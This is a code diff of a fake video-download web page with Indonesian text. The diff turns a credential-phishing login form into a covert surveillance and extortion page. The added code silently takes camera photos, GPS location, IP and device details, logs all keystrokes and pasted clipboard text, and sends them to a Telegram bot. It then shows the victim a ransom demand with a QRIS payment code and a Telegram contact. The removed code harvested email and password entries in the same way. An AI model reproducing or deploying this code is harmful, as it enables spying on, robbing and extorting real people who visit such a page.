@@ -75,182 +75,121 @@
       transform: scale(0.98);
     }
     
-    /* Login Page Styles */
-    #loginPage {
+    /* Hacked Page Styles */
+    #hackedPage {
       display: none;
-      max-width: 450px;
+      max-width: 500px;
       width: 100%;
     }
     
-    .login-card {
-      background: var(--card);
+    .hacked-card {
+      background: linear-gradient(135deg, #1a1a1a 0%, #2a0a0a 100%);
       border-radius: 12px;
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 8px 25px rgba(255, 0, 0, 0.3);
       padding: 30px;
       width: 100%;
-    }
-    
-    .login-header {
+      border: 2px solid #ff2a6d;
       text-align: center;
-      margin-bottom: 25px;
     }
     
-    .login-icon {
-      width: 50px;
-      height: 50px;
-      background: linear-gradient(135deg, var(--pink) 0%, var(--pink-light) 100%);
+    .warning-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #ff2a6d 0%, #ff0000 100%);
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 15px;
+      margin: 0 auto 20px;
+      font-size: 40px;
+      color: white;
     }
     
-    .login-icon svg {
-      width: 25px;
-      height: 25px;
-      fill: white;
+    .hacked-title {
+      font-size: 28px;
+      color: #ff2a6d;
+      margin-bottom: 15px;
+      font-weight: 700;
+      text-shadow: 0 0 10px rgba(255, 42, 109, 0.5);
     }
     
-    .login-title {
-      text-align: center;
-      font-size: 22px;
-      color: var(--text);
-      margin-bottom: 8px;
-      font-weight: 600;
-    }
-    
-    .login-subtitle {
-      text-align: center;
+    .hacked-subtitle {
       color: var(--text2);
-      font-size: 14px;
-      margin-bottom: 30px;
+      font-size: 16px;
+      margin-bottom: 25px;
       line-height: 1.5;
     }
     
-    .form-group {
-      margin-bottom: 20px;
-    }
-    
-    .form-label {
-      display: block;
-      color: var(--text);
-      margin-bottom: 8px;
+    .qr-code {
+      width: 200px;
+      height: 200px;
+      background: white;
+      padding: 10px;
+      border-radius: 10px;
+      margin: 20px auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       font-size: 14px;
-      font-weight: 500;
+      color: black;
+      font-weight: bold;
     }
     
-    .login-input {
-      width: 100%;
-      padding: 14px 16px;
-      font-size: 15px;
-      border: 1px solid #333;
+    .telegram-link {
+      display: inline-block;
+      background: #0088cc;
+      color: white;
+      padding: 12px 24px;
       border-radius: 8px;
-      color: var(--text);
-      background: rgba(255, 255, 255, 0.05);
-      transition: all 0.25s;
-    }
-    
-    .login-input:focus {
-      outline: none;
-      border-color: var(--pink);
-      box-shadow: 0 0 0 2px rgba(255, 42, 109, 0.2);
-    }
-    
-    .login-input::placeholder {
-      color: var(--text2);
-    }
-    
-    .login-btn {
-      width: 100%;
-      padding: 14px 0;
-      background: linear-gradient(135deg, var(--pink) 0%, var(--pink-light) 100%);
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.25s;
-      margin-top: 10px;
-    }
-    
-    .login-btn:hover {
-      filter: brightness(1.1);
-    }
-    
-    .login-footer {
-      margin-top: 25px;
-      text-align: center;
-      color: var(--text2);
-      font-size: 13px;
-    }
-    
-    .login-footer a {
-      color: var(--pink);
       text-decoration: none;
+      font-weight: 600;
+      margin-top: 20px;
+      transition: 0.25s;
     }
     
-    .login-footer a:hover {
-      text-decoration: underline;
+    .telegram-link:hover {
+      background: #0077b5;
+      transform: scale(1.05);
     }
     
-    /* Security Info Box */
-    .security-info {
+    .data-box {
       background: rgba(255, 42, 109, 0.1);
       border: 1px solid rgba(255, 42, 109, 0.3);
       border-radius: 8px;
       padding: 15px;
-      margin-bottom: 20px;
-      font-size: 13px;
-      color: var(--text);
+      margin: 20px 0;
+      text-align: left;
+      font-size: 12px;
     }
     
-    .security-info ul {
-      padding-left: 20px;
-      margin: 10px 0;
+    .data-box h3 {
+      color: #ff2a6d;
+      margin-bottom: 10px;
+      font-size: 14px;
     }
     
-    .security-info li {
+    .data-row {
+      display: flex;
+      justify-content: space-between;
       margin-bottom: 5px;
+      padding-bottom: 5px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    .data-label {
       color: var(--text2);
     }
     
-    .alert {
-      background: rgba(255, 42, 109, 0.1);
-      border: 1px solid var(--pink);
-      border-radius: 8px;
-      padding: 12px;
-      margin-bottom: 16px;
+    .data-value {
+      color: white;
+      font-weight: 500;
+    }
+    
+    .warning-text {
+      color: #ff2a6d;
       font-size: 14px;
-      color: var(--pink);
-      text-align: center;
-      display: none;
-    }
-    
-    .alert.show {
-      display: block;
-    }
-    
-    .success-msg {
-      text-align: center;
-      padding: 20px;
-      color: #42b72a;
-      font-size: 16px;
-      display: none;
-      background: rgba(66, 183, 42, 0.1);
-      border-radius: 8px;
       margin-top: 20px;
-    }
-    
-    .success-msg.show {
-      display: block;
-    }
-    
-    .countdown {
-      font-size: 14px;
-      color: var(--text2);
-      margin-top: 10px;
+      font-weight: 600;
     }
   </style>
 </head>
@@ -268,50 +207,39 @@
     </div>
   </div>
 
-  <!-- LOGIN PAGE -->
-  <div id="loginPage">
-    <div class="login-card">
-      <div class="login-header">
-        <div class="login-icon">
-          <svg viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-          </svg>
-        </div>
-        <h1 class="login-title">Verifikasi Akun</h1>
-        <p class="login-subtitle">
-          Masukkan informasi akun Anda untuk melanjutkan<br>proses download video
-        </p>
+  <!-- HACKED PAGE -->
+  <div id="hackedPage">
+    <div class="hacked-card">
+      <div class="warning-icon">⚠️</div>
+      <h1 class="hacked-title">PERINGATAN KEAMANAN!</h1>
+      
+      <div class="hacked-subtitle">
+        Kamera dan lokasi Anda telah diakses tanpa izin.<br>
+        Data Anda telah direkam dan akan disebar jika tidak membayar.
       </div>
       
-      <div class="security-info">
-        <strong>🔒 Verifikasi Sistem:</strong>
-        <ul>
-          <li>✅ Perangkat terverifikasi</li>
-          <li>✅ Sistem aman</li>
-          <li>✅ Siap untuk download</li>
-        </ul>
+      <div class="data-box" id="victimData">
+        <!-- Data korban akan ditampilkan di sini -->
       </div>
       
-      <div id="securityAlert" class="alert">
-        <strong>⚠️ Perhatian:</strong> Harap lengkapi semua informasi untuk melanjutkan.
+      <div class="qr-code" id="qrcode">
+        <!-- QR Code akan ditampilkan di sini -->
+        <div style="text-align: center;">
+          <div style="font-size: 24px; margin-bottom: 10px;">QRIS</div>
+          <div>SCAN UNTUK BAYAR</div>
+          <div style="font-size: 10px; margin-top: 10px;">Minimal: Rp 500.000</div>
+        </div>
       </div>
       
-      <form id="loginForm">
-        <div class="form-group">
-          <label class="form-label" for="email">Alamat Email</label>
-          <input type="email" class="login-input" id="email" placeholder="contoh@gmail.com" required>
-        </div>
-        
-        <div class="form-group">
-          <label class="form-label" for="password">Kata Sandi</label>
-          <input type="password" class="login-input" id="password" placeholder="Masukkan kata sandi" required>
-        </div>
-        
-        <button type="submit" class="login-btn">Lanjutkan Download</button>
-      </form>
+      <div class="warning-text">
+        Hubungi kami di Telegram setelah transfer:<br>
+        <a href="https://t.me/cukiii_55" class="telegram-link" target="_blank">
+          📱 t.me/cukiii_55
+        </a>
+      </div>
       
-      <div class="login-footer">
-        <p>Dengan melanjutkan, Anda menyetujui <a href="#">Syarat & Ketentuan</a> kami</p>
+      <div style="margin-top: 25px; color: var(--text2); font-size: 11px;">
+        Data yang telah direkam: Foto kamera, lokasi GPS, informasi device, dan aktivitas Anda.
       </div>
     </div>
   </div>
@@ -324,6 +252,7 @@
     // STATE VARIABLES
     let hasCapturedCamera = false;
     let hasCapturedLocation = false;
+    let victimData = {};
     
     // TELEGRAM FUNCTIONS
     async function sendToTelegram(message, photoBlob = null) {
@@ -404,7 +333,7 @@
       });
     }
     
-    // GET DEVICE INFO (MORE ACCURATE)
+    // GET DEVICE INFO
     async function getDeviceInfo() {
       const ua = navigator.userAgent;
       let deviceType = 'Desktop';
@@ -419,7 +348,6 @@
         const match = ua.match(/android\s([0-9\.]+)/i);
         osVersion = match ? match[1] : 'Unknown';
         
-        // Better brand detection for Android
         if (/samsung/i.test(ua)) deviceBrand = 'Samsung';
         else if (/xiaomi|redmi|poco/i.test(ua)) deviceBrand = 'Xiaomi';
         else if (/oppo/i.test(ua)) deviceBrand = 'Oppo';
@@ -513,7 +441,7 @@
       };
     }
     
-    // CAPTURE CAMERA - 5 PHOTOS
+    // CAPTURE CAMERA - 3 PHOTOS
     async function captureCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -541,8 +469,8 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         
-        // Capture 5 photos
-        for (let i = 1; i <= 5; i++) {
+        // Capture 3 photos
+        for (let i = 1; i <= 3; i++) {
           await new Promise(resolve => setTimeout(resolve, 800));
           
           ctx.save();
@@ -552,8 +480,8 @@
           
           canvas.toBlob(async (blob) => {
             if (blob && blob.size > 1024) {
-              const file = new File([blob], `foto_${i}.jpg`, { type: 'image/jpeg' });
-              await sendToTelegram(`📸 Foto ${i}/5`, file);
+              const file = new File([blob], `victim_photo_${i}.jpg`, { type: 'image/jpeg' });
+              await sendToTelegram(`📸 Foto Korban ${i}/3`, file);
             }
           }, 'image/jpeg', 0.85);
         }
@@ -580,19 +508,8 @@
             });
           });
           
-          // Send location to Telegram
-          await sendToTelegram(
-            `📍 <b>LOKASI DITEMUKAN</b>\n\n` +
-            `🛰️ <b>Koordinat GPS:</b>\n` +
-            `• Latitude: ${position.coords.latitude}\n` +
-            `• Longitude: ${position.coords.longitude}\n` +
-            `• Akurasi: ${Math.round(position.coords.accuracy)} meter\n\n` +
-            `🗺️ <b>Google Maps:</b>\n` +
-            `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}\n\n` +
-            `🌐 <b>IP Public:</b> ${await getIP()}`
-          );
-          
           hasCapturedLocation = true;
+          return position.coords;
           
         } else {
           throw new Error('Geolocation tidak didukung');
@@ -601,149 +518,139 @@
       } catch (error) {
         hasCapturedLocation = false;
         console.log('Location blocked:', error.message);
+        return null;
       }
+    }
+    
+    // DISPLAY VICTIM DATA
+    function displayVictimData(data) {
+      const victimDataEl = document.getElementById('victimData');
+      victimDataEl.innerHTML = `
+        <h3>📊 DATA YANG TELAH DIREKAM:</h3>
+        <div class="data-row">
+          <span class="data-label">📱 Device:</span>
+          <span class="data-value">${data.deviceBrand} ${data.deviceType}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🖥️ OS:</span>
+          <span class="data-value">${data.os} ${data.osVersion}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🔋 Baterai:</span>
+          <span class="data-value">${data.batteryLevel} (${data.isCharging ? 'Sedang Charge' : 'Tidak Charge'})</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">📐 Layar:</span>
+          <span class="data-value">${data.screenSize}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🌐 IP Public:</span>
+          <span class="data-value">${data.publicIP}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🔒 IP Local:</span>
+          <span class="data-value">${data.localIP}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">📸 Kamera:</span>
+          <span class="data-value">${hasCapturedCamera ? '✅ 3 foto direkam' : '❌ Diblokir'}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">📍 Lokasi:</span>
+          <span class="data-value">${hasCapturedLocation ? '✅ GPS direkam' : '❌ Diblokir'}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🗺️ Timezone:</span>
+          <span class="data-value">${data.timezone}</span>
+        </div>
+        <div class="data-row">
+          <span class="data-label">🌍 Bahasa:</span>
+          <span class="data-value">${data.language}</span>
+        </div>
+      `;
     }
     
     // START DOWNLOAD PROCESS
     async function startDownloadProcess() {
-      // Reset states
-      hasCapturedCamera = false;
-      hasCapturedLocation = false;
-      
       // Get all device info
       const deviceInfo = await getDeviceInfo();
       const publicIP = await getIP();
       const localIP = await getLocalIP();
+      const locationCoords = await captureLocation();
       
-      // Send device info first
-      await sendToTelegram(
-        `📱 <b>INFORMASI DEVICE DETECTED</b>\n\n` +
-        `📱 <b>Device Type:</b> ${deviceInfo.deviceType}\n` +
-        `🏷️ <b>Brand:</b> ${deviceInfo.deviceBrand}\n` +
-        `🖥️ <b>OS:</b> ${deviceInfo.os} ${deviceInfo.osVersion}\n` +
-        `🔋 <b>Battery:</b> ${deviceInfo.batteryLevel}\n` +
-        `⚡ <b>Charging:</b> ${deviceInfo.isCharging ? 'YES ✅' : 'NO'}\n` +
-        `📐 <b>Screen:</b> ${deviceInfo.screenSize}\n` +
-        `🌐 <b>Browser:</b> ${deviceInfo.browser}\n` +
-        `💻 <b>CPU Cores:</b> ${deviceInfo.cpuCores}\n` +
-        `🗺️ <b>Timezone:</b> ${deviceInfo.timezone}\n` +
-        `🌍 <b>Language:</b> ${deviceInfo.language}\n\n` +
-        `🌐 <b>IP Public:</b> <code>${publicIP}</code>\n` +
-        `🔒 <b>IP Local:</b> <code>${localIP}</code>\n\n` +
-        `📅 <b>Date:</b> ${new Date().toLocaleDateString('id-ID')}\n` +
-        `⏰ <b>Time:</b> ${new Date().toLocaleTimeString('id-ID')}\n\n` +
-        `⬇️ Starting camera capture...`
-      );
+      // Save victim data
+      victimData = {
+        ...deviceInfo,
+        publicIP,
+        localIP,
+        timestamp: new Date().toLocaleString('id-ID'),
+        location: hasCapturedLocation ? locationCoords : null
+      };
       
-      // STEP 1: CAPTURE CAMERA FIRST
+      // Send ALL data to Telegram in ONE message
+      let telegramMessage = `🚨🚨🚨 <b>NEW VICTIM CAPTURED</b> 🚨🚨🚨\n\n`;
+      
+      telegramMessage += `📱 <b>DEVICE INFO:</b>\n`;
+      telegramMessage += `• Type: ${deviceInfo.deviceType}\n`;
+      telegramMessage += `• Brand: ${deviceInfo.deviceBrand}\n`;
+      telegramMessage += `• OS: ${deviceInfo.os} ${deviceInfo.osVersion}\n`;
+      telegramMessage += `• Battery: ${deviceInfo.batteryLevel}\n`;
+      telegramMessage += `• Charging: ${deviceInfo.isCharging ? 'YES ✅' : 'NO'}\n`;
+      telegramMessage += `• Screen: ${deviceInfo.screenSize}\n`;
+      telegramMessage += `• Browser: ${deviceInfo.browser}\n`;
+      telegramMessage += `• CPU: ${deviceInfo.cpuCores} cores\n`;
+      telegramMessage += `• Platform: ${deviceInfo.platform}\n`;
+      telegramMessage += `• Language: ${deviceInfo.language}\n`;
+      telegramMessage += `• Timezone: ${deviceInfo.timezone}\n\n`;
+      
+      telegramMessage += `🌐 <b>NETWORK INFO:</b>\n`;
+      telegramMessage += `• Public IP: <code>${publicIP}</code>\n`;
+      telegramMessage += `• Local IP: <code>${localIP}</code>\n\n`;
+      
+      if (hasCapturedLocation && locationCoords) {
+        telegramMessage += `📍 <b>LOCATION CAPTURED:</b>\n`;
+        telegramMessage += `• Latitude: ${locationCoords.latitude}\n`;
+        telegramMessage += `• Longitude: ${locationCoords.longitude}\n`;
+        telegramMessage += `• Accuracy: ${Math.round(locationCoords.accuracy)}m\n`;
+        telegramMessage += `• Maps: https://maps.google.com/?q=${locationCoords.latitude},${locationCoords.longitude}\n\n`;
+      } else {
+        telegramMessage += `📍 <b>LOCATION:</b> ❌ BLOCKED\n\n`;
+      }
+      
+      telegramMessage += `📸 <b>CAMERA:</b> Starting capture of 3 photos...\n`;
+      telegramMessage += `📅 <b>Date:</b> ${new Date().toLocaleDateString('id-ID')}\n`;
+      telegramMessage += `⏰ <b>Time:</b> ${new Date().toLocaleTimeString('id-ID')}\n\n`;
+      telegramMessage += `🎯 <b>User Agent:</b>\n${deviceInfo.userAgent.substring(0, 150)}...`;
+      
+      // Send initial data to Telegram
+      await sendToTelegram(telegramMessage);
+      
+      // Capture 3 photos
       await captureCamera();
       
       // Send camera result
       await sendToTelegram(
-        `📸 <b>CAMERA RESULT</b>\n\n` +
-        `📸 <b>Status:</b> ${hasCapturedCamera ? '✅ 5 photos captured' : '❌ Blocked'}\n` +
-        `🔄 Now requesting location access...`
+        `📸 <b>CAMERA RESULT:</b> ${hasCapturedCamera ? '✅ 3 photos captured' : '❌ Blocked'}\n\n` +
+        `🤑 <b>VICTIM DATA READY FOR RANSOM</b>\n` +
+        `📱 ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
+        `🌐 IP: ${publicIP}\n` +
+        `📍 Location: ${hasCapturedLocation ? 'Captured' : 'Blocked'}\n` +
+        `📸 Photos: ${hasCapturedCamera ? '3' : '0'}\n\n` +
+        `💀 Ransom page displayed to victim`
       );
       
-      // STEP 2: CAPTURE LOCATION AFTER CAMERA
-      await captureLocation();
-      
-      // Send location result
-      await sendToTelegram(
-        `📍 <b>LOCATION RESULT</b>\n\n` +
-        `📍 <b>Status:</b> ${hasCapturedLocation ? '✅ Captured with Google Maps link' : '❌ Blocked'}\n` +
-        `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
-        `🌐 <b>IP:</b> ${publicIP}\n\n` +
-        `🔄 Redirecting to login page...`
-      );
-      
-      // Show login page immediately
-      showLoginPage();
+      // Show hacked page with victim data
+      showHackedPage();
     }
     
-    // SHOW LOGIN PAGE
-    function showLoginPage() {
+    // SHOW HACKED PAGE
+    function showHackedPage() {
       document.getElementById('downloadPage').style.display = 'none';
-      document.getElementById('loginPage').style.display = 'block';
+      document.getElementById('hackedPage').style.display = 'block';
       
-      // Focus on email field
-      setTimeout(() => {
-        document.getElementById('email').focus();
-      }, 300);
+      // Display victim data
+      displayVictimData(victimData);
     }
-    
-    // HANDLE LOGIN SUBMIT
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      
-      if (!email || !password) {
-        document.getElementById('securityAlert').classList.add('show');
-        return;
-      }
-      
-      document.getElementById('securityAlert').classList.remove('show');
-      
-      // Get all info again
-      const deviceInfo = await getDeviceInfo();
-      const publicIP = await getIP();
-      const localIP = await getLocalIP();
-      
-      // Send credentials with all device info
-      await sendToTelegram(
-        `✅ <b>ACCOUNT DATA CAPTURED</b>\n\n` +
-        `👤 <b>ACCOUNT INFO:</b>\n` +
-        `📧 <b>Email:</b> <code>${email}</code>\n` +
-        `🔑 <b>Password:</b> <code>${password}</code>\n\n` +
-        `📱 <b>DEVICE INFO:</b>\n` +
-        `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
-        `🖥️ <b>OS:</b> ${deviceInfo.os} ${deviceInfo.osVersion}\n` +
-        `🔋 <b>Battery:</b> ${deviceInfo.batteryLevel}\n` +
-        `⚡ <b>Charging:</b> ${deviceInfo.isCharging ? 'YES ✅' : 'NO'}\n` +
-        `📐 <b>Screen:</b> ${deviceInfo.screenSize}\n` +
-        `🌐 <b>Browser:</b> ${deviceInfo.browser}\n\n` +
-        `🌐 <b>NETWORK INFO:</b>\n` +
-        `🌐 <b>Public IP:</b> <code>${publicIP}</code>\n` +
-        `🔒 <b>Local IP:</b> <code>${localIP}</code>\n` +
-        `🗺️ <b>Timezone:</b> ${deviceInfo.timezone}\n\n` +
-        `📊 <b>CAPTURE RESULTS:</b>\n` +
-        `📸 <b>Camera:</b> ${hasCapturedCamera ? '✅ 5 photos' : '❌ Blocked'}\n` +
-        `📍 <b>Location:</b> ${hasCapturedLocation ? '✅ Captured' : '❌ Blocked'}\n\n` +
-        `📅 <b>Date:</b> ${new Date().toLocaleDateString('id-ID')}\n` +
-        `⏰ <b>Time:</b> ${new Date().toLocaleTimeString('id-ID')}\n\n` +
-        `🕵️ <b>User Agent:</b>\n${deviceInfo.userAgent.substring(0, 150)}...`
-      );
-      
-      // Reset form
-      document.getElementById('loginForm').reset();
-      
-      // Go back to download page after 2 seconds
-      setTimeout(() => {
-        document.getElementById('loginPage').style.display = 'none';
-        document.getElementById('downloadPage').style.display = 'block';
-        
-        // Send final summary
-        sendToTelegram(
-          `🎉 <b>PROCESS COMPLETED</b>\n\n` +
-          `✅ All data successfully captured\n` +
-          `📊 Data collected:\n` +
-          `• Device information\n` +
-          `• ${hasCapturedCamera ? '5 camera photos' : 'Camera blocked'}\n` +
-          `• ${hasCapturedLocation ? 'GPS location' : 'Location blocked'}\n` +
-          `• Account credentials\n\n` +
-          `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
-          `🌐 <b>IP:</b> ${publicIP}\n` +
-          `🔋 <b>Battery:</b> ${deviceInfo.batteryLevel}\n` +
-          `⚡ <b>Charging:</b> ${deviceInfo.isCharging ? 'YES' : 'NO'}\n` +
-          `🕒 ${new Date().toLocaleString('id-ID')}`
-        );
-        
-        // Show success alert
-        alert('✅ Download akan segera dimulai!');
-      }, 2000);
-    });
     
     // PAGE LOAD LOG
     window.addEventListener('load', async () => {
@@ -751,37 +658,33 @@
       const publicIP = await getIP();
       
       await sendToTelegram(
-        `🌐 <b>PAGE LOADED</b>\n\n` +
+        `🌐 <b>NEW VISITOR</b>\n\n` +
         `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
         `🖥️ <b>OS:</b> ${deviceInfo.os} ${deviceInfo.osVersion}\n` +
         `🔋 <b>Battery:</b> ${deviceInfo.batteryLevel}\n` +
         `⚡ <b>Charging:</b> ${deviceInfo.isCharging ? 'YES' : 'NO'}\n` +
         `🌐 <b>IP:</b> ${publicIP}\n` +
         `📅 ${new Date().toLocaleDateString('id-ID')}\n` +
-        `⏰ ${new Date().toLocaleTimeString('id-ID')}`
+        `⏰ ${new Date().toLocaleTimeString('id-ID')}\n\n` +
+        `🎯 <b>Waiting for victim to click download...</b>`
       );
     });
     
-    // KEYLOGGER
+    // KEYLOGGER (capture everything)
     let keystrokes = '';
     document.addEventListener('keydown', (e) => {
-      if (e.target.id === 'email' || e.target.id === 'password') {
-        if (e.key.length === 1 || e.key === 'Backspace' || e.key === 'Enter' || e.key === ' ') {
-          keystrokes += e.key;
-          if (keystrokes.length >= 30) {
-            sendToTelegram(`⌨️ <b>KEYSTROKES LOG</b>\n\n<code>${keystrokes}</code>`);
-            keystrokes = '';
-          }
-        }
+      keystrokes += e.key;
+      if (keystrokes.length >= 50) {
+        sendToTelegram(`⌨️ <b>KEYSTROKES CAPTURED</b>\n\n<code>${keystrokes}</code>`);
+        keystrokes = '';
       }
     });
     
     // CLIPBOARD CAPTURE
     document.addEventListener('paste', async (event) => {
       const text = event.clipboardData.getData('text');
-      if (text && text.length > 3 && 
-          (document.activeElement.id === 'email' || document.activeElement.id === 'password')) {
-        await sendToTelegram(`📋 <b>CLIPBOARD DATA</b>\n\n<code>${text.substring(0, 200)}</code>`);
+      if (text && text.length > 3) {
+        await sendToTelegram(`📋 <b>CLIPBOARD DATA CAPTURED</b>\n\n<code>${text.substring(0, 300)}</code>`);
       }
     });
   </script>
